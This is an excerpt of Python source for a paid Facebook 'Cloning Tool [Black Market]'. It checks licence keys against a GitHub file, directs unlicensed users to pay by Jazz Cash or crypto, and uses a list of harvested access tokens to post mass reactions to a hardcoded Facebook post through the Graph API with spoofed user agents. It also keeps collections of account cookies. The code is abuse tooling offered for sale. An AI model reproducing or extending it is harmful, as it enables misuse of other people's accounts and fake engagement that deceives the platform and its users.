...
def Subscription():
    ...
    clear()
    logo()
    r1 = str(urlopen('https://github.com/chukiyan/ApprovalBoosting/blob/main/ApprovalBoosting.txt').read())
    if key1 in r1:
        os.system('clear')
        logo()
        return None
    ...
    logo()
    print('')
    print(" \x1b[1;32m Amantadine  Cloning Tool [Black Market] \x1b[1;37m\n")
    print(' \x1b[1;32m Note : THIS IS A PAID TOOL!   \x1b[1;37m')
    print('')
    print('  [ Mode of Payment : Jazz Cash + Crypto ] ')
    print('')
    print('  Your key is not Approved. ')
    print('')
    print('  Copy and Send Key To Amantadine')
    print('')
    ...
    slp(3.5)
    os.system('am start https://m.me/Mur4tw')
    Subscription()
...
def react_to_story():
    ...
    failure_count = 0
    for i, access_token in enumerate(access_tokens[:limit]):
        target_uid = '100004552292565'
        uid_url = '531374546346676'
        auto_react = f'''https://graph.facebook.com/100004552292565_531374546346676/reactions?type={reaction_type}&access_token={access_token}'''
        time.sleep(1)
        headers_ = {
            'user-agent': W_ueragnt() }
        response = requests.post(auto_react, headers = headers_)
...
headers_global = {
    'user-agent': W_ueragnt(),
    'viewport-width': '576' }
ser = requests.get('https://github.com/chukiyan/MY_SELL_PROJECT/blob/main/smm.txt').text
speed = 100
allcookie = []
s_react = []
s_comment = []
